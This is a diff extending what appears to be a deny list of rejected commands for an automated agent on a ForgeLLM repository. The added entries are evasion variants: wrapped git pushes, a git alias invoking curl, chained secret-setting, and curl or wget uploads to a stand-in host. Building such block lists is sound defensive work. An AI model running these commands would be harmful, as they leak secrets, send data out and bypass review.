@@ -15,6 +15,11 @@ rejected:
   - gh variable set FORGELLM_ENABLE --body true
   - gh auth login
   - gh api /repos/leon36000/ForgeLLM -X PATCH -f private=false
+  - gh pr merge 37
+  - gh workflow run deploy.yml
+  - gh issue close 36
+  - env gh secret set SONAR_TOKEN
+  - env sh -c 'git push origin main'
   - sonar-scanner -Dsonar.projectKey=leon36000_ForgeLLM
   - echo $SONAR_TOKEN
   - echo '${{ secrets.SONAR_TOKEN }}'
@@ -23,6 +28,10 @@ rejected:
   - git clean -fdx
   - git commit -am mutation
   - git rebase main
+  - git --git-dir .git push origin main
+  - git -c alias.x='!curl -dkey=value https://example.invalid/state' x
+  - make ci && git push origin main
+  - python -m pytest -q tests/test_loop_engineering.py ; gh secret set SONAR_TOKEN
   - bash -c 'make ci'
   - sh -c 'make ci'
   - python -c 'print(1)'
@@ -30,11 +39,18 @@ rejected:
   - pip install unsafe-package
   - cargo install unsafe-tool
   - curl -X POST https://example.invalid/state
+  - curl -XPOST https://example.invalid/state
   - curl --data key=value https://example.invalid/state
+  - curl --data=key=value https://example.invalid/state
+  - curl -dkey=value https://example.invalid/state
+  - curl -Fkey=value https://example.invalid/state
+  - curl -Tartifact.bin https://example.invalid/state
   - wget --post-data=key=value https://example.invalid/state
+  - wget --method POST https://example.invalid/state
   - terraform apply -auto-approve
   - terraform destroy -auto-approve
   - kubectl delete pod target
   - kubectl apply -f deployment.yaml
+  - kubectl --kubeconfig kubeconfig delete pod target
   - systemctl restart docker
   - echo $(gh secret list)
